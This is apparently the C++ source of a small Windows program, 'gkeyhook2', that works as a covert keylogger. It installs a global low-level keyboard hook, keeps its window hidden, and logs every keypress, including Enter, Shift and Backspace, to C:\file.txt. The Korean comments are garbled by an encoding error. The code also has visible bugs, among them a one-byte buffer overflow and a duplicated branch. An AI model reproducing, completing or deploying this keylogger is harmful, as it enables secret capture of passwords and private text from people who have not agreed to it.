// gkeyhook2.cpp : ���� ���α׷��� ���� �������� �����մϴ�.
//

#include "stdafx.h"
#include "gkeyhook2.h"

#define MAX_LOADSTRING 100



// ���� ����:
HINSTANCE hInst;								// ���� �ν��Ͻ��Դϴ�.
TCHAR szTitle[MAX_LOADSTRING];					// ���� ǥ���� �ؽ�Ʈ�Դϴ�.
TCHAR szWindowClass[MAX_LOADSTRING];			// �⺻ â Ŭ���� �̸��Դϴ�.

//���� ó��


DWORD dwWritten; // number of bytes written to file
HANDLE hFile;  


// �� �ڵ� ��⿡ ��� �ִ� �Լ��� ������ �����Դϴ�.
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);


HHOOK hHook;


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  
	BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
           PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
           
		   
		   char szTest[2];
		    char digit[1];
		  
			//char letter;
		   if (p->vkCode)  //redirect a to b
		{     
          

            if ( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) ) // Keydown
            {
               
				//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
				
				if (p->vkCode >= 0x41){
										// MessageBox(NULL, "Hello, World", "TEST", MB_OK);

																	
								sprintf_s(szTest, "%c", tolower(p->vkCode)); // use L"" prefix for wide chars
								//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
								
								// tolower(p->vkCode);
					WriteFile(hFile, szTest,1,&dwWritten,NULL);     
				 } else if (p->vkCode == 0x20){
					 char str[] = " ";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
						//					sprintf_s(szTest, "%s", ' '); // use L"" prefix for wide chars
				 } else if (p->vkCode == 0x10){
					  char str[] = "[SHIFT]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
						//					sprintf_s(szTest, "%s", '[SHIFT]'); // use L"" prefix for wide chars
				 } else if (p->vkCode == 0x0D){
				    	char str[] = "\r\n[ENTER]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				//							sprintf_s(szTest, "%s", '\n[ENTER]'); // use L"" prefix for wide chars
			     }  else if (p->vkCode == 0x08){
					  char str[] = "[BACKSPACE]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				//							sprintf_s(szTest, "%s", '[BACKSPACE]'); // use L"" prefix for wide chars
			     }  else if (p->vkCode == 0x09){
					  char str[] = "[TAB]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 }  else if (p->vkCode == 0x11){
					  char str[] = "[CTRL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 }  else if (p->vkCode == 0x2E){
					  char str[] = "[DEL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 } else if (p->vkCode == 0x2E){
					  char str[] = "[DEL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 } else if (p->vkCode == 0x14){
					  char str[] = "[CAPITAL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 
				 } else if (p->vkCode >= 0x30 && p->vkCode <= 0x38){
					 
					 sprintf_s(digit, "%c", p->vkCode); // use L"" prefix for wide chars
											// tolower(p->vkCode);
					WriteFile(hFile, digit,sizeof(digit),&dwWritten,NULL);    
				 }



                           
							
			} 
				

			  
            else if ( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) ) // Keyup
            {
                // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
            }
         
 
            break;
        }

			
          
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}




int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: ���⿡ �ڵ带 �Է��մϴ�.
	MSG msg;
	HACCEL hAccelTable;

	// ���� ���ڿ��� �ʱ�ȭ�մϴ�.
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_GKEYHOOK2, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// ���� ���α׷� �ʱ�ȭ�� �����մϴ�.
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_GKEYHOOK2));

	// �⺻ �޽��� �����Դϴ�.
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  �Լ�: MyRegisterClass()
//
//  ����: â Ŭ������ ����մϴ�.
//
//  ����:
//
//    Windows 95���� �߰��� 'RegisterClassEx' �Լ����� ����
//    �ش� �ڵ尡 Win32 �ý��۰� ȣȯ�ǵ���
//    �Ϸ��� ��쿡�� �� �Լ��� ����մϴ�. �� �Լ��� ȣ���ؾ�
//    �ش� ���� ���α׷��� �����
//    '�ùٸ� ������' ���� �������� ������ �� �ֽ��ϴ�.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_GKEYHOOK2));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_GKEYHOOK2);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   �Լ�: InitInstance(HINSTANCE, int)
//
//   ����: �ν��Ͻ� �ڵ��� �����ϰ� �� â�� ����ϴ�.
//
//   ����:
//
//        �� �Լ��� ���� �ν��Ͻ� �ڵ��� ���� ������ �����ϰ�
//        �� ���α׷� â�� ���� ���� ǥ���մϴ�.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // �ν��Ͻ� �ڵ��� ���� ������ �����մϴ�.

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
	
    // Install the low-level keyboard & mouse hooks
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

	hFile=CreateFile("C:\\file.txt",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
if(hFile==INVALID_HANDLE_VALUE)
  {
    MessageBox(0,"Could not create/open a file","Error",16);
    return 0;
  }




  // ShowWindow(hWnd, nCmdShow);
  // UpdateWindow(hWnd);

   return TRUE;
}

//
//  �Լ�: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  ����: �� â�� �޽����� ó���մϴ�.
//
//  WM_COMMAND	- ���� ���α׷� �޴��� ó���մϴ�.
//  WM_PAINT	- �� â�� �׸��ϴ�.dddsss
//  WM_DESTROY	- ���� �޽����� �Խ��ϰ� ��ȯ�մϴ�.
//
//
LRESULT CALLBACK WndProc(HWND hWnd,UINT iMessage,WPARAM wParam,LPARAM lParam)
{
	switch(iMessage) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return(DefWindowProc(hWnd,iMessage,wParam,lParam));
}
